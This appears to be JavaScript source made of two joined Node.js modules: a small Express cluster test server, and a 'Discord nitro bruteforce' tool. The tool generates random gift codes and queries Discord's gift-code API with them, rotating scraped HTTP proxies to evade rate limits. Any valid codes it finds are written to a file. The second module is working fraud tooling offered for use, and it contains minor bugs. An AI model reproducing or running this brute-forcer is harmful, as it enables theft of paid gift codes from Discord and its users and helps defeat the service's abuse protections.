//Cluster (Para rodar o script em todos os cores)
 module.exports = function(cluster) {
     var express = require('express')
     var app = express()

     app.get('/', function(req, res) {
         console.log('Worker %d started!' + new Date(), cluster.worker.id);
         for (var i = 0; i < 999999999; i++) {}
         res.end('Hello from Worker ' + cluster.worker.id);
         console.log('Worker %d returned!' + new Date(), cluster.worker.id);
     });

     app.listen(8080, function() {
         console.log('[Cluster] Instance %d started! | Process PID %d', cluster.worker.id, cluster.worker.process.pid);
     });


 }
module.exports = {

    start: function() {

        //Main
        process.title = "Dnitro - Cracking hashes...";
        console.log('[Bruteforce] Starting discord nitro bruteforce..');

        const request = require('request');
        const logger = require(__dirname + '/util/logger');
        const fs = require('fs');

        const PROXY_FILE = __dirname + "/../bin/scraped_proxies/good_proxies.txt";
        const triesPerSecond = 0.5;

        var proxyLine = 0;
        var proxyUrl = "";
        var working = [];

        var debug = false;

        //Gera uma string de 16 caracteres (tamanho do discord code padrão)
        getGiftCode = function() {
            let code = '';
            let dict = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            for (var i = 0; i < 16; i++) {
                code = code + dict.charAt(Math.floor(Math.random() * dict.length));
            }
            return code;
        }

        //Esta função faz o programa trocar de linha no PROXY FILE | Esta versão apenas aceita proxys http
        function updateLine() {
            try {
                proxyLine++;
                var lineReader = require('line-reader');
                var readLine = 0;

                lineReader.eachLine(PROXY_FILE, function(line, last) {
                    readLine++;

                    if (readLine === proxyLine) {
                        proxyUrl = "http://" + line;
                        //console.log(proxyUrl);
                    }
                    if (last) {
                        readLine = 0;
                    }
                });
            } catch (error) {
                logger.error('An error occurred:');
                logger.error(error);
                return;
            }
        }

        //Chama a função updateLine
        updateLine();
        

        
        var invalid_counter=0;      
        //Verifica se o código é válido ou não
        checkCode = function(code) {
            var proxiedRequest = request.defaults({
                'proxy': proxyUrl
            });
            proxiedRequest.timeout = 1500;
            proxiedRequest.get(`https://discordapp.com/api/v6/entitlements/gift-codes/${code}?with_application=false&with_subscription_plan=true`, (error, resp, body) => {
                if (error) {
                    if (debug == true) {
                        console.log('\x1b[33m%s\x1b[0m', `Connection error: switching proxy`);
                    }
                    updateLine();
                    return;
                }

                try {

                    body = JSON.parse(body);
                    if (body.message != "Unknown Gift Code" && body.message != "You are being rate limited.") {
                        logger.log('\x1b[41m', 'CODE FOUND: https://discord.gift/${code}');
                        console.log(JSON.stringify(body, null, 4));
                        working.push(`https://discord.gift/${code}`);
                        fs.writeFileSync(__dirname + '/../bin/output/valid_codes.json', JSON.stringify(working, null, 4));
                    } else if (body.message === "You are being rate limited." && body.message == "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently. Please read our docs at https://discordapp.com/developers/docs/topics/rate-limits to prevent this moving forward.") {
                        updateLine();
                        if (debug == true) {
                            logger.info("Rate limit reached");
                        }
                    } else {
                        invalid_counter++;
                        logger.info(`Invalid: ${code} | Tentativa nº `+invalid_counter);
                        // console.log('\x1b[31m%s\x1b[0m', `Invalid: ${code}`);
                        // working.push(`https://discord.gift/${code}`);
                        // fs.writeFileSync(__dirname + '/../bin/output/invalid_codes.json', JSON.stringify(working, null, 4));
                    }
                } catch (error) {
                    logger.error(`An error occurred:`);
                    logger.error(error);
                    return;
                }
            });
        }

        checkCode(getGiftCode());
        setInterval(() => {
            checkCode(getGiftCode());
        }, (5 / triesPerSecond) * 50);
    }
};